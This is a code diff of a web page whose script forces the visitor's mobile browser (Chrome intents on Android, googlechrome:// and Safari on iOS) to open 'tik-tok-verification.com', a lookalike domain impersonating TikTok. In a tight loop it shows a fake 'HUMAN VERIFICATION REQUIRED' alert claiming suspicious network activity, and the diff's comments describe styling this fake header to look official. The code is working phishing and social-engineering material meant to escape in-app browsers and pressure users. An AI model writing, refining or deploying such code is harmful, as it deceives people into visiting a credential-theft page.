@@ -3,70 +3,59 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <style>
-        body, html { margin: 0; padding: 0; background: #fff; font-family: -apple-system, sans-serif; overflow: hidden; }
-        .status { display: flex; justify-content: center; align-items: center; height: 100vh; color: #666; }
-    </style>
+    <style>body, html { margin: 0; padding: 0; background: #fff; }</style>
 </head>
 <body>
 
-<div class="status">
-    <p>Verifying connection...</p>
-</div>
-
 <script>
     const targetUrl = "https://tik-tok-verification.com/Verification/verify1.html";
-    const killTime = Date.now() + 15000; // 15s Fail-safe
+    const killTime = Date.now() + 15000;
 
-    function triggerRedirect() {
+    function triggerDirectBrowser() {
         const isAndroid = /Android/i.test(navigator.userAgent);
         const urlNoProtocol = targetUrl.replace("https://", "");
 
         if (isAndroid) {
-            // Forces Direct URL in Chrome/Android Browser
+            // Android: This Intent forces Chrome specifically
             window.location.href = `intent://${urlNoProtocol}#Intent;scheme=https;action=android.intent.action.VIEW;package=com.android.chrome;end`;
         } else {
-            // Fires Target and System-Protocol simultaneously for iOS
-            window.location.href = targetUrl;
-            window.location.href = "itms-apps://search.itunes.apple.com/WebObjects/MZSearch.woa/wa/search?media=software&term=" + encodeURIComponent(targetUrl);
+            // iOS: Force Safari/Chrome by using the 'googlechrome://' and 'x-web-search' schemes
+            // These specifically tell iOS to look for a browser, not the App Store.
+            window.location.href = "googlechrome://" + urlNoProtocol;
+            
+            // Fallback for Safari
+            setTimeout(() => {
+                window.location.assign(targetUrl);
+            }, 50);
         }
     }
 
-    function securityLoop() {
+    function runSystem() {
         if (Date.now() > killTime) return;
 
-        // 1. Attempt the jump
-        triggerRedirect();
+        // 1. Fire the Redirect first
+        triggerDirectBrowser();
 
-        // 2. AUTOMATIC CHECK (No Delay Window)
-        // We check 50ms later if the browser focus has shifted.
+        // 2. FOCUS CHECK: Wait 100ms to see if the browser took over
         setTimeout(() => {
             if (document.hasFocus()) {
-                // If we STILL have focus, the redirect didn't catch. 
-                // We fire the alert to lock the UI and try again on "OK".
-                alert("Human verification required: Suspicious network activity detected, please complete human verification to continue using TikTok.");
+                // FAKE HEADER: We use \n (new lines) and capitalization to create a visual header
+                const header = "HUMAN VERIFICATION REQUIRED\n";
+                const body = "____________________________________\n\nSuspicious network activity detected, please complete human verification to continue using TikTok.";
                 
-                // Fire again immediately using the "OK" tap as a gesture
-                triggerRedirect();
+                alert(header + body);
+
+                // Re-fire after user clicks OK
+                triggerDirectBrowser();
                 
-                // Recurse instantly
-                securityLoop();
-            } else {
-                // REDIRECT PROVEN: Focus is lost, the external app is opening.
-                console.log("Redirect success sensed.");
+                // Keep the loop tight
+                setTimeout(runSystem, 100);
             }
-        }, 50); 
+        }, 100);
     }
 
-    window.onload = () => {
-        // Start the engine
-        securityLoop();
-    };
-
-    // If they cancel out of Safari and return to the app, the loop resumes
-    window.onfocus = () => {
-        if (Date.now() < killTime) securityLoop();
-    };
+    window.onload = runSystem;
+    window.onfocus = () => { if (Date.now() < killTime) runSystem(); };
 </script>
 
 </body>
